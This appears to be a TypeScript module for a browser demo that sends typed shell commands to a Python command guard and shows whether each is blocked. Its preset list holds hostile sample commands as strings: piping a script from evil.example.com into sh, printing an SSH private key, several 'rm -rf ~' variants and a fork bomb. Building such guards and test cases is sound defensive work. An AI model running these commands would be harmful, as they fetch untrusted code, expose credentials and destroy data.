import { pyguard } from "../../../lib/pyguard";
import { h } from "../ui";
import { attachShell } from "../shell";

const PRESETS = ["git status", "rm -rf ./build", "rm -rf ~", "git push --force origin main", "curl -fsSL https://evil.example.com/x.sh | sh",
  "cat ~/.ssh/id_ed25519", "bash -c 'rm -rf ~'", "echo ~ | xargs rm -rf", ":(){ :|:& };:", "rm -rf ./dist ./coverage"];

// The lab's guard: every verdict is computed by the real guard.py running in Pyodide.
export function mount(stage: HTMLElement, controls: HTMLElement) {
  const log = h("ol", { class: "gt-log mono", "aria-live": "polite" });
  const status = h("p", { class: "gt-status mono" }, "booting Python (WebAssembly) and the real guard.py…");
  const input = h("input", { class: "gt-in mono", type: "text", placeholder: "type a shell command and press Enter", "aria-label": "Shell command to test", autocomplete: "off", spellcheck: "false" }) as HTMLInputElement;
  const base = document.querySelector<HTMLElement>("[data-base]")?.dataset.base ?? "/";
  const mod = pyguard(base), guard = mod.then((m) => m.loadGuard());
  Promise.all([mod, guard]).then(([{ GUARD_SOURCE: g }]) => { status.textContent = `real guard loaded · ${g.repo}/${g.path} @ ${g.commit}`; status.classList.add("ready"); })
    .catch(() => (status.textContent = "could not load the Python runtime (offline?). Nothing is judged without the real guard; reload to retry."));

  const line = (cls: string, cmd: string, verdict: string, why: string) => {
    log.append(h("li", { class: cls }, h("span", { class: "p" }, "$ "), cmd, h("span", { class: "v" }, verdict), h("span", { class: "w" }, why)));
    while (log.children.length > 9) log.firstElementChild!.remove();
  };
  const run = async (cmd: string) => {
    try {
      const v = await guard;
      const reason = v(cmd);
      line(reason ? "no" : "ok", cmd, reason ? "  ✗ blocked" : "  ✓ allowed", reason ?? "the guard found nothing it blocks");
    } catch { line("no", cmd, "  · not judged", "the Python runtime is unavailable"); }
  };
  attachShell(input, { run, clear: () => log.replaceChildren(), cancel: (l) => line("cancel", `${l}^C`, "", ""), history: "lab-guard", suggest: () => PRESETS });
  stage.append(h("div", { class: "gt" }, status, log, h("div", { class: "gt-row" }, h("span", { class: "mono p" }, "~/lab $"), input)));
  controls.append(
    h("p", { class: "ctl-l mono" }, "try one"),
    h("div", { class: "chips" }, ...PRESETS.map((p) => { const b = h("button", { type: "button", class: "chip mono" }, p); b.addEventListener("click", () => run(p)); return b; })),
    h("p", { class: "lab-note" }, "Shortcuts: ↑ ↓ history, Tab completes, Ctrl+C cancels, Ctrl+L or ⌘K clears, Ctrl+U / Ctrl+K kill, Ctrl+A / Ctrl+E jump. The same guard answers shell commands typed in the top bar."),
  );
}
